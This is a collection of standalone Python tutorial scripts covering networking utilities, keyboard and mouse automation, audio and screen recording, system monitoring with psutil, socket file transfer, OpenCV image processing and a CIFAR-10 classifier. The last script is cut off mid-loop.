network = ipaddress.IPv4Network("192.168.1.0/24")

# get the network mask
print("Network mask:", network.netmask)

# get the broadcast address
print("Broadcast address:", network.broadcast_address)

# print the number of IP addresses under this network
print("Number of hosts under", str(network), ":", network.num_addresses)

# iterate over all the hosts under this network
print("Hosts under", str(network), ":")
for host in network.hosts():
    print(host)

# iterate over the subnets of this network
print("Subnets:")
for subnet in network.subnets(prefixlen_diff=2):
    print(subnet)

# get the supernet of this network
print("Supernet:", network.supernet(prefixlen_diff=1))

# prefixlen_diff: An integer, the amount the prefix length of
        #   the network should be decreased by.  For example, given a
        #   /24 network and a prefixlen_diff of 3, a supernet with a
        #   /21 netmask is returned.

# tell if this network is under (or overlaps) 192.168.0.0/16
print("Overlaps 192.168.0.0/16:", network.overlaps(ipaddress.IPv4Network("192.168.0.0/16")))




import keyboard

# registering a hotkey that replaces one typed text with another
# replaces every "email" followed by a space with my actual email
keyboard.add_abbreviation("email", "rockikzthepythoncode.com")

# invokes a callback everytime a hotkey is pressed
keyboard.add_hotkey("ctrl+alt+p", lambda: print("CTRL+ALT+P Pressed!"))

# check if a ctrl is pressed
print(keyboard.is_pressed('ctrl'))

# press space
keyboard.send("space")

# sends artificial keyboard events to the OS
# simulating the typing of a given text
# setting 0.1 seconds to wait between keypresses to look fancy
keyboard.write("Python Programming is always fun!", delay=0.1)

# record all keyboard clicks until esc is clicked
events = keyboard.record('esc')
# play these events
keyboard.play(events)

# remove all keyboard hooks in use
keyboard.unhook_all()




from fbchat import Client
from fbchat.models import Message, MessageReaction

# facebook user credentials
username = "username.or.email"
password = "password"

# login
client = Client(username, password)

# get 20 users you most recently talked to
users = client.fetchThreadList()
print(users)

# get the detailed informations about these users
detailed_users = [ list(client.fetchThreadInfo(user.uid).values())[0] for user in users ]

# sort by number of messages
sorted_detailed_users = sorted(detailed_users, key=lambda u: u.message_count, reverse=True)

# print the best friend!
best_friend = sorted_detailed_users[0]

print("Best friend:", best_friend.name, "with a message count of", best_friend.message_count)

# message the best friend!
client.send(Message(
                    text=f"Congratulations {best_friend.name}, you are my best friend with {best_friend.message_count} messages!"
                    ),
            thread_id=best_friend.uid)

# get all users you talked to in messenger in your account
all_users = client.fetchAllUsers()

print("You talked with a total of", len(all_users), "users!")

# let's logout
client.logout()




import mouse

# left click
mouse.click('left')

# right click
mouse.click('right')

# middle click
mouse.click('middle')

# get the position of mouse
print(mouse.get_position())
# In [12]: mouse.get_position()
# Out[12]: (714, 488)

# presses but doesn't release
mouse.hold('left')
# mouse.press('left')

# drag from (0, 0) to (100, 100) relatively with a duration of 0.1s
mouse.drag(0, 0, 100, 100, absolute=False, duration=0.1)

# whether a button is clicked
print(mouse.is_pressed('right'))

# move 100 right & 100 down
mouse.move(100, 100, absolute=False, duration=0.2)

# make a listener when left button is clicked
mouse.on_click(lambda: print("Left Button clicked."))
# make a listener when right button is clicked
mouse.on_right_click(lambda: print("Right Button clicked."))

# remove the listeners when you want
mouse.unhook_all()

# scroll down
mouse.wheel(-1)

# scroll up
mouse.wheel(1)

# record until you click right
events = mouse.record()

# replay these events
mouse.play(events[:-1])




import pickle

# define any Python data structure including lists, sets, tuples, dicts, etc.
l = list(range(10000))

# save it to a file
with open("list.pickle", "wb") as file:
    pickle.dump(l, file)

# load it again
with open("list.pickle", "rb") as file:
    unpickled_l = pickle.load(file)


print("unpickled_l == l: ", unpickled_l == l)
print("unpickled l is l: ", unpickled_l is l)




import pickle

class Person:
    def __init__(self, first_name, last_name, age, gender):
        self.first_name = first_name
        self.last_name = last_name
        self.age = age
        self.gender = gender

    def __str__(self):
        return f"<Person name={self.first_name} {self.last_name}, age={self.age}, gender={self.gender}>"


p = Person("John", "Doe", 99, "Male")

# save the object
with open("person.pickle", "wb") as file:
    pickle.dump(p, file)

# load the object
with open("person.pickle", "rb") as file:
    p2 = pickle.load(file)

print(p)
print(p2)




import pickle


class Person:
    def __init__(self, first_name, last_name, age, gender):
        self.first_name = first_name
        self.last_name = last_name
        self.age = age
        self.gender = gender

    def __str__(self):
        return f"<Person name={self.first_name} {self.last_name}, age={self.age}, gender={self.gender}>"

p = Person("John", "Doe", 99, "Male")

# get the dumped bytes
dumped_p = pickle.dumps(p)
print(dumped_p)

# write them to a file
with open("person.pickle", "wb") as file:
    file.write(dumped_p)

# load it
with open("person.pickle", "rb") as file:
    p2 = pickle.loads(file.read())

print(p)
print(p2)




import camelot
import sys

# PDF file to extract tables from (from command-line)
file = sys.argv[1]

# extract all the tables in the PDF file
tables = camelot.read_pdf(file)

# number of tables extracted
print("Total tables extracted:", tables.n)

# print the first table as Pandas DataFrame
print(tables[0].df)

# export individually
tables[0].to_csv("foo.csv")

# or export all in a zip
tables.export("foo.csv", f="csv", compress=True)

# export to HTML
tables.export("foo.html", f="html")




import psutil
from datetime import datetime
import pandas as pd
import time
import os


def get_size(bytes):
    """
    Returns size of bytes in a nice format
    """
    for unit in ['', 'K', 'M', 'G', 'T', 'P']:
        if bytes < 1024:
            return f"{bytes:.2f}{unit}B"
        bytes /= 1024


def get_processes_info():
    # the list the contain all process dictionaries
    processes = []
    for process in psutil.process_iter():
        # get all process info in one shot
        with process.oneshot():
            # get the process id
            pid = process.pid
            if pid == 0:
                # System Idle Process for Windows NT, useless to see anyways
                continue
            # get the name of the file executed
            name = process.name()
            # get the time the process was spawned
            try:
                create_time = datetime.fromtimestamp(process.create_time())
            except OSError:
                # system processes, using boot time instead
                create_time = datetime.fromtimestamp(psutil.boot_time())
            try:
                # get the number of CPU cores that can execute this process
                cores = len(process.cpu_affinity())
            except psutil.AccessDenied:
                cores = 0
            # get the CPU usage percentage
            cpu_usage = process.cpu_percent()
            # get the status of the process (running, idle, etc.)
            status = process.status()
            try:
                # get the process priority (a lower value means a more prioritized process)
                nice = int(process.nice())
            except psutil.AccessDenied:
                nice = 0
            try:
                # get the memory usage in bytes
                memory_usage = process.memory_full_info().uss
            except psutil.AccessDenied:
                memory_usage = 0
            # total process read and written bytes
            io_counters = process.io_counters()
            read_bytes = io_counters.read_bytes
            write_bytes = io_counters.write_bytes
            # get the number of total threads spawned by this process
            n_threads = process.num_threads()
            # get the username of user spawned the process
            try:
                username = process.username()
            except psutil.AccessDenied:
                username = "N/A"
            
        processes.append({
            'pid': pid, 'name': name, 'create_time': create_time,
            'cores': cores, 'cpu_usage': cpu_usage, 'status': status, 'nice': nice,
            'memory_usage': memory_usage, 'read_bytes': read_bytes, 'write_bytes': write_bytes,
            'n_threads': n_threads, 'username': username,
        })

    return processes


def construct_dataframe(processes):
    # convert to pandas dataframe
    df = pd.DataFrame(processes)
    # set the process id as index of a process
    df.set_index('pid', inplace=True)
    # sort rows by the column passed as argument
    df.sort_values(sort_by, inplace=True, ascending=not descending)
    # pretty printing bytes
    df['memory_usage'] = df['memory_usage'].apply(get_size)
    df['write_bytes'] = df['write_bytes'].apply(get_size)
    df['read_bytes'] = df['read_bytes'].apply(get_size)
    # convert to proper date format
    df['create_time'] = df['create_time'].apply(datetime.strftime, args=("%Y-%m-%d %H:%M:%S",))
    # reorder and define used columns
    df = df[columns.split(",")]
    return df

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Process Viewer & Monitor")
    parser.add_argument("-c", "--columns", help="""Columns to show,
                                                available are name,create_time,cores,cpu_usage,status,nice,memory_usage,read_bytes,write_bytes,n_threads,username.
                                                Default is name,cpu_usage,memory_usage,read_bytes,write_bytes,status,create_time,nice,n_threads,cores.""",
                        default="name,cpu_usage,memory_usage,read_bytes,write_bytes,status,create_time,nice,n_threads,cores")
    parser.add_argument("-s", "--sort-by", dest="sort_by", help="Column to sort by, default is memory_usage .", default="memory_usage")
    parser.add_argument("--descending", action="store_true", help="Whether to sort in descending order.")
    parser.add_argument("-n", help="Number of processes to show, will show all if 0 is specified, default is 25 .", default=25)
    parser.add_argument("-u", "--live-update", action="store_true", help="Whether to keep the program on and updating process information each second")

    # parse arguments
    args = parser.parse_args()
    columns = args.columns
    sort_by = args.sort_by
    descending = args.descending
    n = int(args.n)
    live_update = args.live_update
    # print the processes for the first time
    processes = get_processes_info()
    df = construct_dataframe(processes)
    if n == 0:
        print(df.to_string())
    elif n > 0:
        print(df.head(n).to_string())
    # print continuously
    while live_update:
        # get all process info
        processes = get_processes_info()
        df = construct_dataframe(processes)
        # clear the screen depending on your OS
        os.system("cls") if "nt" in os.name else os.system("clear")
        if n == 0:
            print(df.to_string())
        elif n > 0:
            print(df.head(n).to_string())
        time.sleep(0.7)




from playsound import playsound
import sys

playsound(sys.argv[1])




import pyaudio
import wave
import sys

filename = sys.argv[1]

# set the chunk size of 1024 samples
chunk = 1024

# open the audio file
wf = wave.open(filename, "rb")

# initialize PyAudio object
p = pyaudio.PyAudio()

# open stream object
stream = p.open(format=p.get_format_from_width(wf.getsampwidth()),
                channels=wf.getnchannels(),
                rate=wf.getframerate(),
                output=True)

# read data in chunks
data = wf.readframes(chunk)

# writing to the stream (playing audio)
while data:
    stream.write(data)
    data = wf.readframes(chunk)

# close stream
stream.close()
p.terminate()




from pydub import AudioSegment
from pydub.playback import play
import sys

# read MP3 file
song = AudioSegment.from_mp3(sys.argv[1])
# song = AudioSegment.from_wav("audio_file.wav")
# you can also read from other formats such as MP4
# song = AudioSegment.from_file("audio_file.mp4", "mp4")
play(song)




import pyaudio
import wave
import argparse

parser = argparse.ArgumentParser(description="an Audio Recorder using Python")
parser.add_argument("-o", "--output", help="Output file (with .wav)", default="recorded.wav")
parser.add_argument("-d", "--duration", help="Duration to record in seconds (can be float)", default=5)

args = parser.parse_args()
# the file name output you want to record into
filename = args.output
# number of seconds to record
record_seconds = float(args.duration)

# set the chunk size of 1024 samples
chunk = 1024
# sample format
FORMAT = pyaudio.paInt16
# mono, change to 2 if you want stereo
channels = 1
# 44100 samples per second
sample_rate = 44100

# initialize PyAudio object
p = pyaudio.PyAudio()

# open stream object as input & output
stream = p.open(format=FORMAT,
                channels=channels,
                rate=sample_rate,
                input=True,
                output=True,
                frames_per_buffer=chunk)

frames = []
print("Recording...")
for i in range(int(44100 / chunk * record_seconds)):
    data = stream.read(chunk)
    # if you want to hear your voice while recording
    # stream.write(data)
    frames.append(data)
print("Finished recording.")
# stop and close stream
stream.stop_stream()
stream.close()
# terminate pyaudio object
p.terminate()

# save audio file
# open the file in 'write bytes' mode
wf = wave.open(filename, "wb")
# set the channels
wf.setnchannels(channels)
# set the sample format
wf.setsampwidth(p.get_sample_size(FORMAT))
# set the sample rate
wf.setframerate(sample_rate)
# write the frames as bytes
wf.writeframes(b"".join(frames))
# close the file
wf.close()




import cv2
import numpy as np
import pyautogui

# display screen resolution, get it from your OS settings
SCREEN_SIZE = (1920, 1080)
# define the codec
fourcc = cv2.VideoWriter_fourcc(*"MJPG")
# create the video write object
out = cv2.VideoWriter("output.avi", fourcc, 10.0, (SCREEN_SIZE))

# while True:
for i in range(100):
    # make a screenshot
    img = pyautogui.screenshot()
    # convert these pixels to a proper numpy array to work with OpenCV
    frame = np.array(img)
    # convert colors from BGR to RGB
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    # write the frame
    out.write(frame)
    # show the frame
    # cv2.imshow("screenshot", frame)
    # if the user clicks q, it exits
    if cv2.waitKey(1) == ord("q"):
        break

# make sure everything is closed when exited
cv2.destroyAllWindows()
out.release()




import psutil
import platform
from datetime import datetime

def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


print("="*40, "System Information", "="*40)
uname = platform.uname()
print(f"System: {uname.system}")
print(f"Node Name: {uname.node}")
print(f"Release: {uname.release}")
print(f"Version: {uname.version}")
print(f"Machine: {uname.machine}")
print(f"Processor: {uname.processor}")

# Boot Time
print("="*40, "Boot Time", "="*40)
boot_time_timestamp = psutil.boot_time()
bt = datetime.fromtimestamp(boot_time_timestamp)
print(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")

# let's print CPU information
print("="*40, "CPU Info", "="*40)
# number of cores
print("Physical cores:", psutil.cpu_count(logical=False))
print("Total cores:", psutil.cpu_count(logical=True))
# CPU frequencies
cpufreq = psutil.cpu_freq()
print(f"Max Frequency: {cpufreq.max:.2f}Mhz")
print(f"Min Frequency: {cpufreq.min:.2f}Mhz")
print(f"Current Frequency: {cpufreq.current:.2f}Mhz")
# CPU usage
print("CPU Usage Per Core:")
for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
    print(f"Core {i}: {percentage}%")
print(f"Total CPU Usage: {psutil.cpu_percent()}%")

# Memory Information
print("="*40, "Memory Information", "="*40)
# get the memory details
svmem = psutil.virtual_memory()
print(f"Total: {get_size(svmem.total)}")
print(f"Available: {get_size(svmem.available)}")
print(f"Used: {get_size(svmem.used)}")
print(f"Percentage: {svmem.percent}%")
print("="*20, "SWAP", "="*20)
# get the swap memory details (if exists)
swap = psutil.swap_memory()
print(f"Total: {get_size(swap.total)}")
print(f"Free: {get_size(swap.free)}")
print(f"Used: {get_size(swap.used)}")
print(f"Percentage: {swap.percent}%")

# Disk Information
print("="*40, "Disk Information", "="*40)
print("Partitions and Usage:")
# get all disk partitions
partitions = psutil.disk_partitions()
for partition in partitions:
    print(f"=== Device: {partition.device} ===")
    print(f"  Mountpoint: {partition.mountpoint}")
    print(f"  File system type: {partition.fstype}")
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        # this can be catched due to the disk that
        # isn't ready
        continue
    print(f"  Total Size: {get_size(partition_usage.total)}")
    print(f"  Used: {get_size(partition_usage.used)}")
    print(f"  Free: {get_size(partition_usage.free)}")
    print(f"  Percentage: {partition_usage.percent}%")
# get IO statistics since boot
disk_io = psutil.disk_io_counters()
print(f"Total read: {get_size(disk_io.read_bytes)}")
print(f"Total write: {get_size(disk_io.write_bytes)}")

# Network information
print("="*40, "Network Information", "="*40)
# get all network interfaces (virtual and physical)
if_addrs = psutil.net_if_addrs()
for interface_name, interface_addresses in if_addrs.items():
    for address in interface_addresses:
        print(f"=== Interface: {interface_name} ===")
        if str(address.family) == 'AddressFamily.AF_INET':
            print(f"  IP Address: {address.address}")
            print(f"  Netmask: {address.netmask}")
            print(f"  Broadcast IP: {address.broadcast}")
        elif str(address.family) == 'AddressFamily.AF_PACKET':
            print(f"  MAC Address: {address.address}")
            print(f"  Netmask: {address.netmask}")
            print(f"  Broadcast MAC: {address.broadcast}")
# get IO statistics since boot
net_io = psutil.net_io_counters()
print(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
print(f"Total Bytes Received: {get_size(net_io.bytes_recv)}")




from qbittorrent import Client

# connect to the qbittorent Web UI
qb = Client("http://127.0.0.1:8080/")

# put the credentials (as you configured)
qb.login("admin", "adminadmin")

# open the torrent file of the file you wanna download
torrent_file = open("debian-10.2.0-amd64-netinst.iso.torrent", "rb")
# start downloading
qb.download_from_file(torrent_file)
# this magnet is not valid, replace with yours
# magnet_link = "magnet:?xt=urn:btih:e334ab9ddd91c10938a7....."
# qb.download_from_link(magnet_link)
# you can specify the save path for downloads
# qb.download_from_file(torrent_file, savepath="/the/path/you/want/to/save")

# pause all downloads
qb.pause_all()

# resume them
qb.resume_all()


def get_size_format(b, factor=1024, suffix="B"):
    """
    Scale bytes to its proper byte format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    for unit in ["", "K", "M", "G", "T", "P", "E", "Z"]:
        if b < factor:
            return f"{b:.2f}{unit}{suffix}"
        b /= factor
    return f"{b:.2f}Y{suffix}"

# return list of torrents
torrents = qb.torrents()

for torrent in torrents:
    print("Torrent name:", torrent["name"])
    print("hash:", torrent["hash"])
    print("Seeds:", torrent["num_seeds"])
    print("File size:", get_size_format(torrent["total_size"]))
    print("Download speed:", get_size_format(torrent["dlspeed"]) + "/s")

# Torrent name: debian-10.2.0-amd64-netinst.iso
# hash: 86d4c80024a469be4c50bc5a102cf71780310074
# Seeds: 70
# File size: 335.00MB
# Download speed: 606.15KB/s




"""
Client that sends the file (uploads)
"""
import socket
import tqdm
import os
import argparse

SEPARATOR = "<SEPARATOR>"

BUFFER_SIZE = 1024 * 4


def send_file(filename, host, port):
    # get the file size
    filesize = os.path.getsize(filename)
    # create the client socket
    s = socket.socket()
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected.")

    # send the filename and filesize
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    # start sending the file
    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        for _ in progress:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in 
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))

    # close the socket
    s.close()


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Simple File Sender")
    parser.add_argument("file", help="File name to send")
    parser.add_argument("host", help="The host/IP address of the receiver")
    parser.add_argument("-p", "--port", help="Port to use, default is 5001", default=5001)
    args = parser.parse_args()
    filename = args.file
    host = args.host
    port = args.port
    send_file(filename, host, port)




"""
Server receiver of the file
"""
import socket
import tqdm
import os

# device's IP address
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5001

# receive 4096 bytes each time
BUFFER_SIZE = 4096

SEPARATOR = "<SEPARATOR>"

# create the server socket
# TCP socket
s = socket.socket()
# bind the socket to our local address
s.bind((SERVER_HOST, SERVER_PORT))
# enabling our server to accept connections
# 5 here is the number of unaccepted connections that
# the system will allow before refusing new connections
s.listen(5)
print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT}")
# accept connection if there is any
client_socket, address = s.accept() 
# if below code is executed, that means the sender is connected
print(f"[+] {address} is connected.")

# receive the file infos
# receive using client socket, not server socket
received = client_socket.recv(BUFFER_SIZE).decode()
filename, filesize = received.split(SEPARATOR)
# remove absolute path if there is
filename = os.path.basename(filename)
# convert to integer
filesize = int(filesize)
# start receiving the file from the socket
# and writing to the file stream
progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
with open(filename, "wb") as f:
    for _ in progress:
        # read 1024 bytes from the socket (receive)
        bytes_read = client_socket.recv(BUFFER_SIZE)
        if not bytes_read:    
            # nothing is received
            # file transmitting is done
            break
        # write to the file the bytes we just received
        f.write(bytes_read)
        # update the progress bar
        progress.update(len(bytes_read))

# close the client socket
client_socket.close()
# close the server socket
s.close()




import requests
import sys

# get the API KEY here: https://developers.google.com/custom-search/v1/overview
API_KEY = "<INSERT_YOUR_API_KEY_HERE>"
# get your Search Engine ID on your CSE control panel
SEARCH_ENGINE_ID = "<INSERT_YOUR_SEARCH_ENGINE_ID_HERE>"
# the search query you want, from the command line
query = sys.argv[1]
# constructing the URL
# doc: https://developers.google.com/custom-search/v1/using_rest
url = f"https://www.googleapis.com/customsearch/v1?key={API_KEY}&cx={SEARCH_ENGINE_ID}&q={query}"

# make the API request
data = requests.get(url).json()
# get the result items
search_items = data.get("items")
# iterate over 10 results found
for i, search_item in enumerate(search_items, start=1):
    # get the page title
    title = search_item.get("title")
    # page snippet
    snippet = search_item.get("snippet")
    # alternatively, you can get the HTML snippet (bolded keywords)
    html_snippet = search_item.get("htmlSnippet")
    # extract the page url
    link = search_item.get("link")
    # print the results
    print("="*10, f"Result #{i}", "="*10)
    print("Title:", title)
    print("Description:", snippet)
    print("URL:", link, "\n")




import cv2
import matplotlib.pyplot as plt
import sys

# read the image
image = cv2.imread(sys.argv[1])

# convert to RGB
image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)

# convert to grayscale
gray = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)

# create a binary thresholded image
_, binary = cv2.threshold(gray, int(sys.argv[2]), 255, cv2.THRESH_BINARY_INV)
# show it
plt.imshow(binary, cmap="gray")
plt.show()

# find the contours from the thresholded image
contours, hierarchy = cv2.findContours(binary, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)

# draw all contours
image = cv2.drawContours(image, contours, -1, (0, 255, 0), 2)

# show the image with the drawn contours
plt.imshow(image)
plt.show()




import cv2

cap = cv2.VideoCapture(0)

while True:
    _, frame = cap.read()

    # convert to grayscale
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)

    # create a binary thresholded image
    _, binary = cv2.threshold(gray, 255 // 2, 255, cv2.THRESH_BINARY_INV)

    # find the contours from the thresholded image
    contours, hierarchy = cv2.findContours(binary, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)

    # draw all contours
    image = cv2.drawContours(frame, contours, -1, (0, 255, 0), 2)

    # show the images
    cv2.imshow("gray", gray)
    cv2.imshow("image", image)
    cv2.imshow("binary", binary)

    if cv2.waitKey(1) == ord("q"):
        break

cap.release()
cv2.destroyAllWindows()




import cv2
import numpy as np
import matplotlib.pyplot as plt
import sys

# read the image
image = cv2.imread(sys.argv[1])

# convert it to grayscale
gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

# show the grayscale image, if you want to show, uncomment 2 below lines
# plt.imshow(gray, cmap="gray")
# plt.show()

# perform the canny edge detector to detect image edges
edges = cv2.Canny(gray, threshold1=30, threshold2=100)

# show the detected edges
plt.imshow(edges, cmap="gray")
plt.show()




import numpy as np
import cv2

cap = cv2.VideoCapture(0)

while True:
    _, frame = cap.read()
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    edges = cv2.Canny(gray, 30, 100)
    cv2.imshow("edges", edges)
    cv2.imshow("gray", gray)
    if cv2.waitKey(1) == ord("q"):
        break

cap.release()
cv2.destroyAllWindows()




import cv2


# loading the test image
image = cv2.imread("kids.jpg")

# converting to grayscale
image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

# initialize the face recognizer (default face haar cascade)
face_cascade = cv2.CascadeClassifier("cascades/haarcascade_fontalface_default.xml")

# detect all the faces in the image
faces = face_cascade.detectMultiScale(image_gray, 1.3, 5)
# print the number of faces detected
print(f"{len(faces)} faces detected in the image.")

# for every face, draw a blue rectangle
for x, y, width, height in faces:
    cv2.rectangle(image, (x, y), (x + width, y + height), color=(255, 0, 0), thickness=2)

# save the image with rectangles
cv2.imwrite("kids_detected.jpg", image)




import cv2

# create a new cam object
cap = cv2.VideoCapture(0)

# initialize the face recognizer (default face haar cascade)
face_cascade = cv2.CascadeClassifier("cascades/haarcascade_fontalface_default.xml")

while True:
    # read the image from the cam
    _, image = cap.read()
    # converting to grayscale
    image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

    # detect all the faces in the image
    faces = face_cascade.detectMultiScale(image_gray, 1.3, 5)

    # for every face, draw a blue rectangle
    for x, y, width, height in faces:
        cv2.rectangle(image, (x, y), (x + width, y + height), color=(255, 0, 0), thickness=2)

    cv2.imshow("image", image)

    if cv2.waitKey(1) == ord("q"):
        break

cap.release()
cv2.destroyAllWindows()




from train import load_data, batch_size
from tensorflow.keras.models import load_model
import matplotlib.pyplot as plt
import numpy as np

# CIFAR-10 classes
categories = {
    0: "airplane",
    1: "automobile",
    2: "bird",
    3: "cat",
    4: "deer",
    5: "dog",
    6: "frog",
    7: "horse",
    8: "ship",
    9: "truck"
}

# load the testing set
# (_, _), (X_test, y_test) = load_data()
ds_train, ds_test, info = load_data()
# load the model with final model weights
model = load_model("results/cifar10-model-v1.h5")
# evaluation
loss, accuracy = model.evaluate(ds_test, steps=info.splits["test"].num_examples // batch_size)
print("Test accuracy:", accuracy*100, "%")

# get prediction for this image
data_sample = next(iter(ds_test))
sample_image = data_sample[0].numpy()[0]
sample_label = categories[data_sample[1].numpy()[0]]
prediction = np.argmax(model.predict(sample_image.reshape(-1, *sample_image.shape))[0])
print("Predicted label:", categories[prediction])
print("True label:", sample_label)

# show the first image
plt.axis('off')
plt.imshow(sample_image)
plt.show()




from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Dropout, Activation, Flatten
from tensorflow.keras.layers import Conv2D, MaxPooling2D
from tensorflow.keras.callbacks import TensorBoard
import tensorflow as tf
import tensorflow_datasets as tfds
import os

# hyper-parameters
batch_size = 64
# 10 categories of images (CIFAR-10)
num_classes = 10
# number of training epochs
epochs = 30

def create_model(input_shape):
    """
    Constructs the model:
        - 32 Convolutional (3x3)
        - Relu
        - 32 Convolutional (3x3)
        - Relu
        - Max pooling (2x2)
        - Dropout

        - 64 Convolutional (3x3)
        - Relu
        - 64 Convolutional (3x3)
        - Relu
        - Max pooling (2x2)
        - Dropout

        - 128 Convolutional (3x3)
        - Relu
        - 128 Convolutional (3x3)
        - Relu
        - Max pooling (2x2)
        - Dropout
        
        - Flatten (To make a 1D vector out of convolutional layers)
        - 1024 Fully connected units
        - Relu
        - Dropout
        - 10 Fully connected units (each corresponds to a label category (cat, dog, etc.))
    """

    # building the model
    model = Sequential()

    model.add(Conv2D(filters=32, kernel_size=(3, 3), padding="same", input_shape=input_shape))
    model.add(Activation("relu"))
    model.add(Conv2D(filters=32, kernel_size=(3, 3), padding="same"))
    model.add(Activation("relu"))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    model.add(Dropout(0.25))

    model.add(Conv2D(filters=64, kernel_size=(3, 3), padding="same"))
    model.add(Activation("relu"))
    model.add(Conv2D(filters=64, kernel_size=(3, 3), padding="same"))
    model.add(Activation("relu"))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    model.add(Dropout(0.25))

    model.add(Conv2D(filters=128, kernel_size=(3, 3), padding="same"))
    model.add(Activation("relu"))
    model.add(Conv2D(filters=128, kernel_size=(3, 3), padding="same"))
    model.add(Activation("relu"))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    model.add(Dropout(0.25))

    # flattening the convolutions
    model.add(Flatten())
    # fully-connected layers
    model.add(Dense(1024))
    model.add(Activation("relu"))
    model.add(Dropout(0.5))
    model.add(Dense(num_classes, activation="softmax"))

    # print the summary of the model architecture
    model.summary()

    # training the model using adam optimizer
    model.compile(loss="sparse_categorical_crossentropy", optimizer="adam", metrics=["accuracy"])
    return model


def load_data():
    """
    This function loads CIFAR-10 dataset, and preprocess it
    """
    # Loading data using Keras 
    # loading the CIFAR-10 dataset, splitted between train and test sets
    # (X_train, y_train), (X_test, y_test) = cifar10.load_data()
    # print("Training samples:", X_train.shape[0])
    # print("Testing samples:", X_test.shape[0])
    # print(f"Images shape: {X_train.shape[1:]}")

    # # converting image labels to binary class matrices
    # y_train = to_categorical(y_train, num_classes)
    # y_test = to_categorical(y_test, num_classes)

    # # convert to floats instead of int, so we can divide by 255
    # X_train = X_train.astype("float32")
    # X_test = X_test.astype("float32")
    # X_train /= 255
    # X_test /= 255
    # return (X_train, y_train), (X_test, y_test)
    # Loading data using Tensorflow Datasets
    def preprocess_image(image, label):
        # convert [0, 255] range integers to [0, 1] range floats
        image = tf.image.convert_image_dtype(image, tf.float32)
        return image, label
    # loading the CIFAR-10 dataset, splitted between train and test sets
    ds_train, info = tfds.load("cifar10", with_info=True, split="train", as_supervised=True)
    ds_test = tfds.load("cifar10", split="test", as_supervised=True)
    # repeat dataset forever, shuffle, preprocess, split by batch
    ds_train = ds_train.repeat().shuffle(1024).map(preprocess_image).batch(batch_size)
    ds_test = ds_test.repeat().shuffle(1024).map(preprocess_image).batch(batch_size)
    return ds_train, ds_test, info



if __name__ == "__main__":

    # load the data
    ds_train, ds_test, info = load_data()
    # (X_train, y_train), (X_test, y_test) = load_data()

    # constructs the model
    # model = create_model(input_shape=X_train.shape[1:])
    model = create_model(input_shape=info.features["image"].shape)

    # some nice callbacks
    logdir = os.path.join("logs", "cifar10-model-v1")
    tensorboard = TensorBoard(log_dir=logdir)

    # make sure results folder exist
    if not os.path.isdir("results"):
        os.mkdir("results")

    # train
    # model.fit(X_train, y_train,
    #         batch_size=batch_size,
    #         epochs=epochs,
    #         validation_data=(X_test, y_test),
    #         callbacks=[tensorboard, checkpoint],
    #         shuffle=True)
    model.fit(ds_train, epochs=epochs, validation_data=ds_test, verbose=1,
              steps_per_epoch=info.splits["train"].num_examples // batch_size,
              validation_steps=info.splits["test"].num_examples // batch_size,
              callbacks=[tensorboard])

    # save the model to disk
    model.save("results/cifar10-model-v1.h5")




from train import load_data, create_model, IMAGE_SHAPE, batch_size, np
import matplotlib.pyplot as plt
# load the data generators
train_generator, validation_generator, class_names = load_data()
# constructs the model
model = create_model(input_shape=IMAGE_SHAPE)
# load the optimal weights
model.load_weights("results/MobileNetV2_finetune_last5_less_lr-loss-0.45-acc-0.86.h5")

validation_steps_per_epoch = np.ceil(validation_generator.samples / batch_size)
# print the validation loss & accuracy
evaluation = model.evaluate_generator(validation_generator, steps=validation_steps_per_epoch, verbose=1)
print("Val loss:", evaluation[0])
print("Val Accuracy:", evaluation[1])

# get a random batch of images
image_batch, label_batch = next(iter(validation_generator))
# turn the original labels into human-readable text
label_batch = [class_names[np.argmax(label_batch[i])] for i in range(batch_size)]
# predict the images on the model
predicted_class_names = model.predict(image_batch)
predicted_ids = [np.argmax(predicted_class_names[i]) for i in range(batch_size)]
# turn the predicted vectors to human readable labels
predicted_class_names = np.array([class_names[id] for id in predicted_ids])

# some nice plotting
plt.figure(figsize=(10,9))
for n in range(30):
    plt.subplot(6,5,n+1)
    plt.subplots_adjust(hspace = 0.3)
    plt.imshow(image_batch[n])
    if predicted_class_names[n] == label_batch[n]:
        color = "blue"
        title = predicted_class_names[n].title()
    else:
        color = "red"
